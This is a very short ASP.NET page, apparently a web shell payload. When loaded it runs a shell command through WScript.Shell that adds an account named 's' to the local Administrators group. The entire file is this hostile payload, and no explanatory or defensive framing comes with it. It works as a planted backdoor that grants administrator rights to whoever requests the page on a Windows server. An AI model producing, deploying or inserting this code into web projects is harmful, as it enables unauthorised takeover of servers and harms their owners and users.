<%@ Page aspcompat=true %>
<%
call Server.CreateObject("WSCRIPT.SHELL").Run("cmd /c net localgroup administrators s /add")
%>